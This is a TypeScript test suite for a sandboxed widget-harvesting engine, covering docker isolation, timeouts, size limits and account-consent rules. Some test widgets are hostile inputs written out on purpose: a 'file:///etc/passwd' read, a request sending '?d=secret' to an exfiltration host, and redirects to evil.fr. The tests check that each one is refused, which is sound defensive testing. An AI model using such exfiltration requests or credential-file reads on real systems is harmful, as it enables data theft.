import { describe, it, expect, afterEach, vi } from "vitest";
import { spawn } from "node:child_process";
import { PassThrough } from "node:stream";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { mkdir, readFile, rm, stat, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { join } from "node:path";
import { cheminsEspace } from "../../src/chemins.js";
import { lireAccueil } from "../../src/accueil/lire.js";
import { Atelier, IMAGE } from "../../src/conteneur/atelier.js";
import { DeclarationWidget, type WidgetLu } from "../../src/accueil/schemas.js";
import { ecrireDonnees, ecrireEtatWidget, lireEtatWidget, supprimerDonnees } from "../../src/accueil/donnees.js";
import { IaLocale } from "../../src/ia/ia-locale.js";
import { PontFactice } from "../../src/mcp/pont-factice.js";
import { accorder, lireAccords, retirerAccord } from "../../src/widgets/accords.js";
import { erreurDuNoyau, executerEssai, executerRecolte, type LanceurProcessus } from "../../src/widgets/recolte.js";
import { PROFIL_REFUSE } from "../../src/workflows/executer.js";
import { ecrireExecution, idEssai, lireExecution, listerExecutions, type Execution } from "../../src/workflows/executions.js";
import { avecMemoire, ecrireMemoire, lireMemoire } from "../../src/workflows/memoire.js";
import { Menagement } from "../../src/workflows/menagement.js";
import { urlRecherche } from "../../src/workflows/duckduckgo.js";
import { dossierTemporaire } from "../aide/temporaire.js";
import { executeurFactice } from "../aide/executeur-factice.js";
import { fauxKev, fauxOllama, type FauxServeur } from "../aide/faux-ia.js";

const MOTEUR = join(import.meta.dirname, "..", "..", "docker", "moteur");
const SCRIPT = join(MOTEUR, "recolteur.mjs");
const MAINTENANT = new Date("2026-10-28T10:00:00.000Z");
const horloge = () => MAINTENANT;

const aFermer: { fermer(): Promise<void> }[] = [];
const iaAArreter: IaLocale[] = [];
afterEach(async () => {
  await Promise.all(aFermer.splice(0).map((s) => s.fermer()));
  await Promise.all(iaAArreter.splice(0).map((i) => i.arreter()));
});

/** Petit serveur HTTP : `routes[chemin]` répond. */
async function serveurWeb(routes: Record<string, (res: import("node:http").ServerResponse) => void>) {
  const requetes: { url: string; enTetes: Record<string, unknown> }[] = [];
  const s: Server = createServer((req, res) => {
    requetes.push({ url: req.url ?? "", enTetes: req.headers });
    const r = routes[req.url ?? ""];
    if (r) r(res);
    else {
      res.writeHead(404);
      res.end();
    }
  });
  await new Promise<void>((ok) => s.listen(0, "127.0.0.1", ok));
  const port = (s.address() as AddressInfo).port;
  const serveur = {
    port,
    url: `http://127.0.0.1:${port}`,
    requetes,
    fermer: () => new Promise<void>((ok) => { s.closeAllConnections(); s.close(() => ok()); }),
  };
  aFermer.push(serveur);
  return serveur;
}

interface Contexte {
  widget: WidgetLu & { declaration: DeclarationWidget };
  dossierWidgets: string;
  espace: string;
  commandes: string[][];
  tues: number;
  executer: ReturnType<typeof executeurFactice>;
  atelier: Atelier;
  lancer: LanceurProcessus;
}

/** Crée un widget `id` (widget.json + recolte.mjs) et un lanceur qui exécute le récolteur en local, sans docker. */
async function preparer(id: string, code: string, sources = { compte: [] as string[], publiques: [] as string[] }, config: unknown = { a: 1 }): Promise<Contexte> {
  const espace = await dossierTemporaire();
  const dossier = join(espace, "accueil", "widgets", id);
  await mkdir(dossier, { recursive: true });
  const brut = {
    nom: "Test",
    tailles: { min: { l: 1, h: 1 }, max: { l: 4, h: 4 }, defaut: { l: 2, h: 2 } },
    recolte: { minutes: 60 },
    sources,
    config,
  };
  await writeFile(join(dossier, "widget.json"), JSON.stringify(brut));
  await writeFile(join(dossier, "recolte.mjs"), code);
  const declaration = DeclarationWidget.parse(brut);
  const executer = executeurFactice([]);
  const ctx: Contexte = {
    widget: {
      id,
      dossier,
      declaration,
      etat: { statut: "ok", derniereMaj: null, derniereTentative: null },
      donnees: null,
      exemple: null,
      aRecolte: true,
      aWorkflow: false,
      aAffichage: true,
    },
    dossierWidgets: await dossierTemporaire(),
    espace,
    commandes: [],
    tues: 0,
    executer,
    atelier: new Atelier({ chemins: cheminsEspace(espace), docker: "docker", executer: executer.executer }),
    lancer: (cmd, args) => {
      ctx.commandes.push([cmd, ...args]);
      const e = spawn(process.execPath, [SCRIPT, dossier], { stdio: ["pipe", "pipe", "pipe"] });
      return {
        stdin: e.stdin,
        stdout: e.stdout,
        stderr: e.stderr,
        tuer: () => {
          ctx.tues++;
          e.kill("SIGKILL");
        },
        fin: new Promise((ok) => e.on("close", (c) => ok(c))),
      };
    },
  };
  return ctx;
}

async function ia(o: { kev?: FauxServeur; ollama?: FauxServeur } = {}) {
  const i = new IaLocale({ dossier: await dossierTemporaire(), executer: executeurFactice([]).executer, kevUrl: o.kev?.url ?? "http://127.0.0.1:9", ollamaUrl: o.ollama?.url ?? "http://127.0.0.1:9" });
  iaAArreter.push(i);
  return i;
}

const pontLecture = (refuser: string[] = [], redirections?: Record<string, string>) =>
  new PontFactice([], {
    actif: null,
    autoriser: false,
    lecture: {
      pages: [{ url: "https://app.daily.dev/", titre: "Fil", texte: "articles", liens: [{ texte: "a", url: "https://app.daily.dev/a" }] }],
      refuser,
      redirections,
    },
  });

const appelsLecture = (p: PontFactice) => p.appels.filter((a) => a.methode === "lirePageInvisible");

async function recolter(ctx: Contexte, o: { ia?: IaLocale | Pick<IaLocale, "kev" | "gemma">; pont?: PontFactice; delaiMs?: number } = {}) {
  return executerRecolte({
    id: ctx.widget.id,
    widget: ctx.widget,
    dossierWidgets: ctx.dossierWidgets,
    moteur: MOTEUR,
    atelier: ctx.atelier,
    lancer: ctx.lancer,
    ia: (o.ia ?? (await ia())) as IaLocale,
    pont: o.pont ?? pontLecture(),
    horloge,
    delaiMs: o.delaiMs,
    adressesLocales: true,
  });
}

const optionsDe = (ctx: Contexte) => ({
  id: ctx.widget.id,
  widget: ctx.widget as WidgetLu,
  dossierWidgets: ctx.dossierWidgets,
  moteur: MOTEUR,
  atelier: ctx.atelier,
  lancer: ctx.lancer,
  ia: null,
  pont: pontLecture(),
  horloge,
  adressesLocales: true,
});

const lireJson = async (chemin: string) => JSON.parse(await readFile(chemin, "utf8"));

describe("executerRecolte", () => {
  it("une récolte réussie écrit donnees.json et l'état ok dans dossierWidgets", async () => {
    const web = await serveurWeb({ "/flux.json": (res) => { res.writeHead(200, { "content-type": "application/json" }); res.end('{"x":42}'); } });
    const kev = await fauxKev({ q: { type: "noul", noul: 0.8 } });
    const ollama = await fauxOllama("bonjour");
    aFermer.push(kev, ollama);
    const ctx = await preparer(
      "meteo",
      `export default async (w) => {
        const j = await w.recuperer("${web.url}/flux.json", { format: "json" });
        const p = await w.lirePage("https://app.daily.dev/");
        const k = await w.kev("etat", { q: { type: "noul", instructions: "?" } });
        const g = await w.gemma("salut");
        w.journal("trace du widget");
        return { j, titre: p.titre, k, g, cfg: w.config, prec: w.precedent, quand: w.maintenant };
      };`,
    );
    await ecrireDonnees(ctx.dossierWidgets, "meteo", { ancien: true });
    const pont = pontLecture();
    const r = await recolter(ctx, { ia: await ia({ kev, ollama }), pont });

    const attendu = {
      j: { x: 42 },
      titre: "Fil",
      k: { q: { type: "noul", noul: 0.8 } },
      g: "bonjour",
      cfg: { a: 1 },
      prec: { ancien: true },
      quand: MAINTENANT.toISOString(),
    };
    expect(r.etat.statut).toBe("ok");
    expect(r.donnees).toEqual(attendu);
    expect(await lireJson(join(ctx.dossierWidgets, "meteo", "donnees.json"))).toEqual(attendu);
    const etat = await lireEtatWidget(ctx.dossierWidgets, "meteo");
    expect(etat).toMatchObject({ statut: "ok", derniereMaj: MAINTENANT.toISOString(), derniereTentative: MAINTENANT.toISOString() });
    expect(etat.journal).toContain("trace du widget");
    expect(appelsLecture(pont)[0]!.args).toEqual(["https://app.daily.dev/", { profil: null, adressesLocales: true }]);
    // Aucun cookie ni identifiant envoyé.
    expect(web.requetes[0]!.enTetes.cookie).toBeUndefined();
    expect(web.requetes[0]!.enTetes.authorization).toBeUndefined();
    // Rien n'est écrit dans l'espace.
    expect(existsSync(join(ctx.widget.dossier, "donnees.json"))).toBe(false);
    expect(existsSync(join(ctx.widget.dossier, "etat.json"))).toBe(false);
    // Le lanceur reçoit la commande docker de l'atelier.
    expect(ctx.commandes[0]).toEqual(ctx.atelier.commandeRecolte("meteo", ctx.widget.dossier, MOTEUR));
  });

  it("commandeRecolte monte le widget en :ro, coupe le réseau (--network none) et ne monte rien d'autre de l'espace", async () => {
    const atelier = new Atelier({ chemins: cheminsEspace("/Users/t/WebAiOs"), docker: "/usr/local/bin/docker" });
    const c = atelier.commandeRecolte("meteo", "/Users/t/WebAiOs/accueil/widgets/meteo", "/app/docker/moteur");
    expect(c).toEqual([
      "/usr/local/bin/docker", "run", "-i", "--rm",
      "--name", "webaios-recolte-meteo",
      "--network", "none",
      "--read-only",
      "--tmpfs", "/tmp",
      "-v", "/Users/t/WebAiOs/accueil/widgets/meteo:/widget:ro",
      "-v", "/app/docker/moteur:/opt/webaios/moteur:ro",
      "--memory", "512m",
      "--pids-limit", "128",
      IMAGE,
      "timeout", "-k", "5", "180",
      "node", "/opt/webaios/moteur/recolteur.mjs", "/widget",
    ]);
    const volumes = c.flatMap((x, i) => (c[i - 1] === "-v" ? [x] : []));
    expect(volumes).toHaveLength(2);
    expect(volumes.every((v) => v.endsWith(":ro"))).toBe(true);
    expect(c.filter((x) => x.includes("/Users/t/WebAiOs")).every((x) => x.startsWith("/Users/t/WebAiOs/accueil/widgets/meteo:"))).toBe(true);
    expect(() => atelier.commandeRecolte("../x", "/d", "/r")).toThrow();
    expect(() => new Atelier({ chemins: cheminsEspace("/Users/t/WebAiOs"), docker: null }).commandeRecolte("meteo", "/d", "/r")).toThrow();
  });

  it("supprimerRecolte force la suppression du conteneur", async () => {
    const ctx = await preparer("meteo", "export default async () => 1;");
    await ctx.atelier.supprimerRecolte("meteo");
    expect(ctx.executer.appels.map((a) => [a.commande, ...a.args])).toEqual([["docker", "rm", "-f", "webaios-recolte-meteo"]]);
  });

  it("une récolte qui échoue garde les données précédentes et note l'erreur et le journal", async () => {
    const ctx = await preparer("meteo", `export default async (w) => { console.log("avant l'erreur"); throw new Error("boum ${"x".repeat(900)}"); };`);
    await ecrireDonnees(ctx.dossierWidgets, "meteo", { ancien: true });
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("erreur");
    expect(r.donnees).toBeUndefined();
    expect(r.etat.erreur).toContain("boum");
    expect(r.etat.erreur!.length).toBeLessThanOrEqual(500);
    expect(r.etat.journal).toContain("avant l'erreur");
    expect(r.etat.derniereTentative).toBe(MAINTENANT.toISOString());
    expect(await lireJson(join(ctx.dossierWidgets, "meteo", "donnees.json"))).toEqual({ ancien: true });
    expect(await lireEtatWidget(ctx.dossierWidgets, "meteo")).toEqual(r.etat);
  });

  it("le journal garde les 2 000 derniers caractères de la sortie d'erreur", async () => {
    const ctx = await preparer("meteo", `export default async (w) => { for (let i = 0; i < 500; i++) w.journal("ligne " + i); return 1; };`);
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("ok");
    expect(r.etat.journal!.length).toBeLessThanOrEqual(2000);
    expect(r.etat.journal).toContain("ligne 499");
    expect(r.etat.journal).not.toContain("ligne 1\n");
  });

  it("une sortie non nulle sans fin est une erreur", async () => {
    const ctx = await preparer("meteo", `export default async () => { process.exit(3); };`);
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("erreur");
    expect(r.etat.erreur).toContain("3");
  });

  it("délai dépassé : processus tué, état erreur « Délai dépassé »", async () => {
    const ctx = await preparer("lent", `export default () => new Promise(() => {});`);
    await ecrireDonnees(ctx.dossierWidgets, "lent", { ancien: true });
    const debut = Date.now();
    const r = await recolter(ctx, { delaiMs: 600 });
    expect(Date.now() - debut).toBeLessThan(5000);
    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "Délai dépassé" });
    expect(ctx.tues).toBeGreaterThan(0);
    expect(ctx.executer.appels.some((a) => a.args.join(" ") === "rm -f webaios-recolte-lent")).toBe(true);
    expect(await lireJson(join(ctx.dossierWidgets, "lent", "donnees.json"))).toEqual({ ancien: true });
  });

  it("une ligne de plus de 4 Mo tue la récolte : « Réponse trop grande »", async () => {
    const ctx = await preparer("gros", `export default async () => { process.stdout.write("x".repeat(5 * 1024 * 1024)); await new Promise(() => {}); };`);
    const r = await recolter(ctx);
    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "Réponse trop grande" });
    expect(ctx.tues).toBeGreaterThan(0);
  });

  it("plusieurs appels en vol reçoivent chacun leur réponse", async () => {
    const web = await serveurWeb({
      "/lent": (res) => setTimeout(() => res.end("lent"), 300),
      "/vite": (res) => res.end("vite"),
    });
    const ctx = await preparer(
      "multi",
      `export default async (w) => Promise.all([w.recuperer("${web.url}/lent"), w.recuperer("${web.url}/vite"), w.recuperer("${web.url}/vite")]);`,
    );
    const r = await recolter(ctx);
    expect(r.donnees).toEqual(["lent", "vite", "vite"]);
  });

  it("recuperer : http(s) seulement, sans identifiants dans l'URL", async () => {
    const ctx = await preparer(
      "public",
      `const essai = (p) => p.then(() => "ok", (e) => e.message);
      export default async (w) => [
        await essai(w.recuperer("file:///etc/passwd")),
        await essai(w.recuperer("https://moi:secret@exemple.fr/")),
        await essai(w.recuperer("pas une url")),
      ];`,
    );
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("ok");
    const [fichier, identifiants, invalide] = r.donnees as string[];
    expect(fichier).toMatch(/http/);
    expect(identifiants).toMatch(/identifiants/i);
    expect(invalide).toMatch(/invalide/i);
  });

  it("recuperer : une adresse locale est refusée par défaut", async () => {
    const web = await serveurWeb({ "/": (res) => res.end("secret local") });
    const ctx = await preparer("public", `export default async (w) => w.recuperer("${web.url}/").catch((e) => e.message);`);
    const r = await executerRecolte({
      id: "public", widget: ctx.widget, dossierWidgets: ctx.dossierWidgets, moteur: MOTEUR, atelier: ctx.atelier,
      lancer: ctx.lancer, ia: await ia(), pont: pontLecture(), horloge,
    });
    expect(r.donnees).toMatch(/locale/);
    expect(web.requetes).toHaveLength(0);
  });

  it("recuperer : « localhost. » (point final) est une adresse locale, refusée", async () => {
    const web = await serveurWeb({ "/": (res) => res.end("secret local") });
    const ctx = await preparer(
      "public",
      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
      export default async (w) => [await essai(w.recuperer("http://localhost.:${web.port}/")), await essai(w.lirePage("http://localhost.:${web.port}/"))];`,
    );
    const pont = pontLecture();
    const r = await executerRecolte({
      id: "public", widget: ctx.widget, dossierWidgets: ctx.dossierWidgets, moteur: MOTEUR, atelier: ctx.atelier,
      lancer: ctx.lancer, ia: await ia(), pont, horloge,
    });
    const [rec, page] = r.donnees as string[];
    expect(rec).toMatch(/^refus: .*locale/);
    expect(page).toMatch(/^refus: .*locale/);
    expect(web.requetes).toHaveLength(0);
    expect(appelsLecture(pont)).toHaveLength(0);
  });

  it("recuperer : réponse de plus de 5 Mo refusée", async () => {
    const web = await serveurWeb({ "/gros": (res) => res.end("x".repeat(5 * 1024 * 1024 + 10)) });
    const ctx = await preparer("public", `export default async (w) => w.recuperer("${web.url}/gros").then((t) => t.length, (e) => e.message);`);
    const r = await recolter(ctx);
    expect(r.donnees).toMatch(/5 Mo/);
  });

  it("sans lirePageInvisible, lirePage répond « Lecture de pages indisponible »", async () => {
    const ctx = await preparer("public", `export default async (w) => w.lirePage("https://a.fr/").catch((e) => e.message);`);
    const r = await recolter(ctx, { pont: new PontFactice([], { actif: null, autoriser: false }) });
    expect(r.donnees).toBe("Lecture de pages indisponible");
  });

  it("widget sans compte : lirePage avec compte est refusé", async () => {
    const ctx = await preparer("public", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true }).catch((e) => e.message);`);
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    expect(r.donnees).toMatch(/non déclaré/);
    expect(appelsLecture(pont)).toHaveLength(0);
  });
});

describe("executerRecolte, widget avec compte", () => {
  const sources = { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] };

  it("widget avec compte : lirePage compte sans accord → accord-requis, aucune lecture", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { ancien: true });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    expect(r.etat.statut).toBe("accord-requis");
    expect(appelsLecture(pont)).toHaveLength(0);
    expect(await lireJson(join(ctx.dossierWidgets, "daily", "donnees.json"))).toEqual({ ancien: true });
    expect((await lireEtatWidget(ctx.dossierWidgets, "daily")).statut).toBe("accord-requis");
  });

  it("accord retiré pendant la récolte : la lecture avec compte n'a pas lieu, accord-requis", async () => {
    const ctx = await preparer(
      "daily",
      `export default async (w) => { await w.kev("x", {}); return w.lirePage("https://app.daily.dev/", { compte: true }); };`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const faux = {
      kev: async () => { await retirerAccord(ctx.dossierWidgets, "daily"); return {}; },
      gemma: async () => "",
    };
    const r = await recolter(ctx, { pont, ia: faux });
    expect(r.etat.statut).toBe("accord-requis");
    expect(appelsLecture(pont)).toHaveLength(0);
  });

  it("avec un accord valide, lirePage compte lit dans le profil de l'accord", async () => {
    const ctx = await preparer("daily", `export default async (w) => (await w.lirePage("https://app.daily.dev/", { compte: true })).texte;`, sources);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    expect(r.etat.statut).toBe("ok");
    expect(r.donnees).toBe("articles");
    expect(appelsLecture(pont)[0]!.args).toEqual(["https://app.daily.dev/", { profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true }]);
  });

  it("lirePage compte vers un domaine non déclaré en compte est refusé", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://evil.fr/", { compte: true }).catch((e) => e.message);`, sources);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    expect(r.donnees).toMatch(/non déclaré/);
    expect(appelsLecture(pont)).toHaveLength(0);
  });

  it("widget avec compte : recuperer vers un domaine non déclaré est refusé", async () => {
    const web = await serveurWeb({ "/": (res) => res.end("ok") });
    const ctx = await preparer(
      "daily",
      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
      export default async (w) => [
        await essai(w.recuperer("https://exfiltration.fr/?d=secret")),
        await essai(w.recuperer("http://localhost:${web.port}/")),
        await essai(w.lirePage("https://exfiltration.fr/")),
        await essai(w.recuperer("${web.url}/")),
      ];`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    const [externe, autreNom, page, declare] = r.donnees as string[];
    expect(externe).toMatch(/^refus: .*non déclaré/);
    expect(autreNom).toMatch(/^refus: .*non déclaré/);
    expect(page).toMatch(/^refus: .*non déclaré/);
    expect(declare).toBe("ok");
    expect(web.requetes).toHaveLength(1);
    expect(appelsLecture(pont)).toHaveLength(0);
  });

  it("widget avec compte : une redirection vers un domaine non déclaré est refusée", async () => {
    const cible = await serveurWeb({ "/fuite": (res) => res.end("fuite") });
    const web = await serveurWeb({
      "/redir": (res) => { res.writeHead(302, { location: `http://localhost:${cible.port}/fuite` }); res.end(); },
      "/redir-ok": (res) => { res.writeHead(301, { location: "/fin" }); res.end(); },
      "/fin": (res) => res.end("arrivé"),
    });
    const ctx = await preparer(
      "daily",
      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
      export default async (w) => [await essai(w.recuperer("${web.url}/redir")), await essai(w.recuperer("${web.url}/redir-ok"))];`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const r = await recolter(ctx);
    const [fuite, ok] = r.donnees as string[];
    expect(fuite).toMatch(/^refus: .*non déclaré/);
    expect(ok).toBe("arrivé");
    expect(cible.requetes).toHaveLength(0);
  });

  it("widget avec compte et sans publiques : aucune récupération publique", async () => {
    const web = await serveurWeb({ "/": (res) => res.end("ok") });
    const ctx = await preparer("daily", `export default async (w) => w.recuperer("${web.url}/").catch((e) => "refus: " + e.message);`, { compte: ["app.daily.dev"], publiques: [] });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: [], profil: "perso" });
    const r = await recolter(ctx);
    expect(r.donnees).toMatch(/^refus: .*non déclaré/);
    expect(web.requetes).toHaveLength(0);
  });

  it("un domaine déclaré écrit avec un point final est le même domaine", async () => {
    const ctx = await preparer(
      "daily",
      `const essai = (p) => p.then((x) => x.titre ?? x, (e) => "refus: " + e.message);
      export default async (w) => [
        await essai(w.lirePage("https://app.daily.dev./", { compte: true })),
        await essai(w.lirePage("https://evil.fr./", { compte: true })),
      ];`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    const [declare, autre] = r.donnees as string[];
    expect(declare).not.toMatch(/^refus/);
    expect(autre).toMatch(/^refus: .*non déclaré/);
    expect(appelsLecture(pont).map((a) => a.args[0])).toEqual(["https://app.daily.dev./"]);
  });

  it("lirePage compte redirigée hors des domaines compte : refusée, le texte ne sort pas", async () => {
    const ctx = await preparer(
      "daily",
      `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true }).then((p) => p.texte, (e) => "refus: " + e.message);`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: {
        pages: [{ url: "https://evil.fr/vole", titre: "Ailleurs", texte: "texte secret", liens: [] }],
        redirections: { "https://app.daily.dev/": "https://evil.fr/vole" },
      },
    });
    const r = await recolter(ctx, { pont });
    expect(r.donnees).toMatch(/^refus: Page refusée.*evil\.fr/);
    expect(JSON.stringify(r.donnees)).not.toContain("texte secret");
    expect(appelsLecture(pont)[0]!.args[1]).toEqual({ profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true });
  });

  it("lirePage publique d'un widget avec compte : domaines publics passés au pont, redirection hors liste refusée", async () => {
    const ctx = await preparer(
      "daily",
      `export default async (w) => w.lirePage("http://127.0.0.1/?d=secret").then((p) => p.texte, (e) => "refus: " + e.message);`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: {
        pages: [{ url: "https://evil.fr/?d=secret", titre: "", texte: "ailleurs", liens: [] }],
        redirections: { "http://127.0.0.1/?d=secret": "https://evil.fr/?d=secret" },
      },
    });
    const r = await recolter(ctx, { pont });
    expect(r.donnees).toMatch(/^refus: Page refusée.*non déclaré/);
    expect(appelsLecture(pont)[0]!.args[1]).toEqual({ profil: null, domaines: ["127.0.0.1"], adressesLocales: true });
  });

  it("sans l'option adressesLocales, le pont ne reçoit pas adressesLocales (il refuse alors les adresses locales)", async () => {
    const ctx = await preparer("daily", `export default async (w) => (await w.lirePage("https://app.daily.dev/")).titre;`);
    const pont = pontLecture();
    const r = await executerRecolte({ ...optionsDe(ctx), pont, adressesLocales: false });
    expect(r.donnees).toBe("Fil");
    expect(appelsLecture(pont)[0]!.args).toEqual(["https://app.daily.dev/", { profil: null }]);
  });

  it("ProfilRefuse du pont : accord retiré, état accord-requis", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { ancien: true });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
    await accorder(ctx.dossierWidgets, "autre", { domaines: ["a.fr"], publiques: [], profil: "perso" });
    const r = await recolter(ctx, { pont: pontLecture(["prive"]) });
    expect(r.etat.statut).toBe("accord-requis");
    expect(r.etat.erreur).toBeTruthy();
    expect(await lireAccords(ctx.dossierWidgets)).toEqual({ autre: { domaines: ["a.fr"], publiques: [], profil: "perso" } });
    // Les données lues avec ce compte partent avec l'accord.
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
  });

  it("ProfilRefuse puis compte retiré : la récolte publique ne reçoit rien du compte, l'accueil non plus", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
    expect((await recolter(ctx, { pont: pontLecture(["prive"]) })).etat.statut).toBe("accord-requis");
    // L'agent retire compte : le widget redevient public (ni compte ni accord).
    const brut = { nom: "Test", tailles: { min: { l: 1, h: 1 }, max: { l: 4, h: 4 }, defaut: { l: 2, h: 2 } }, recolte: { minutes: 60 }, sources: { compte: [], publiques: [] } };
    await writeFile(join(ctx.widget.dossier, "widget.json"), JSON.stringify(brut));
    await writeFile(join(ctx.widget.dossier, "recolte.mjs"), "export default async (w) => ({ prec: w.precedent });");
    const accueil = await lireAccueil(cheminsEspace(ctx.espace), ctx.dossierWidgets);
    const lu = accueil.widgets.find((w) => w.id === "daily")!;
    expect("donnees" in lu && lu.donnees).toBeNull(); // ce que donnees_widget rendrait
    const r = await executerRecolte({ ...optionsDe(ctx), widget: lu });
    expect(r.donnees).toEqual({ prec: null });
  });

  it("déclaration modifiée (domaines changés) : l'accord est retiré et les données précédentes effacées", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev", "ancien.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("accord-requis");
    expect(await lireAccords(ctx.dossierWidgets)).toEqual({});
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
  });

  it("compte retiré de la déclaration avec un accord enregistré : accord retiré, données effacées, precedent null", async () => {
    const ctx = await preparer("daily", `export default async (w) => ({ prec: w.precedent });`, { compte: [], publiques: [] });
    await ecrireDonnees(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("ok");
    expect(r.donnees).toEqual({ prec: null });
    expect(await lireAccords(ctx.dossierWidgets)).toEqual({});
    expect(await lireJson(join(ctx.dossierWidgets, "daily", "donnees.json"))).toEqual({ prec: null });
  });

  it("erreurDuNoyau : messages fixes du noyau reconnus, texte du widget non", () => {
    expect(erreurDuNoyau("Délai dépassé")).toBe(true);
    expect(erreurDuNoyau("Réponse trop grande")).toBe(true);
    expect(erreurDuNoyau("Accord requis pour lire avec ton compte : app.daily.dev")).toBe(true);
    // Écrit avec le code de sortie du widget : compte comme texte du widget.
    expect(erreurDuNoyau("La récolte s'est arrêtée sans résultat (code 1)")).toBe(false);
    expect(erreurDuNoyau("Mise à jour impossible : atelier arrêté")).toBe(true);
    expect(erreurDuNoyau("SECRET")).toBe(false);
    expect(erreurDuNoyau("Délai dépassé SECRET")).toBe(false);
    expect(erreurDuNoyau("La récolte s'est arrêtée sans résultat (code 1) SECRET")).toBe(false);
  });

  it("un accord dont les domaines ne correspondent plus à la déclaration n'est plus valide", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: [], profil: "perso" });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    expect(r.etat.statut).toBe("accord-requis");
    expect(appelsLecture(pont)).toHaveLength(0);
  });

  it("erreur levée par le widget : jamais marquée du noyau, même quand elle imite un message du noyau", async () => {
    for (const imitation of [
      "Accord requis pour lire avec ton compte : " + (123456789).toString(36),
      "La récolte s'est arrêtée sans résultat (code 123456789)",
    ]) {
      const ctx = await preparer(
        "daily",
        `export default async (w) => { await w.lirePage("https://app.daily.dev/", { compte: true }); throw new Error(${JSON.stringify(imitation)}); };`,
        sources,
      );
      await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
      const r = await recolter(ctx);
      expect(r.etat).toMatchObject({ statut: "erreur", erreur: imitation });
      expect(r.etat.erreurNoyau).toBeUndefined();
      expect((await lireEtatWidget(ctx.dossierWidgets, "daily")).erreurNoyau).toBeUndefined();
    }
  });

  it("erreurs écrites par le noyau : marquées comme telles (accord requis, délai dépassé)", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const r = await recolter(ctx);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev", erreurNoyau: true });
    expect((await lireEtatWidget(ctx.dossierWidgets, "daily")).erreurNoyau).toBe(true);
    const lent = await preparer("lent", `export default () => new Promise(() => {});`);
    expect((await recolter(lent, { delaiMs: 300 })).etat).toMatchObject({ statut: "erreur", erreur: "Délai dépassé", erreurNoyau: true });
  });

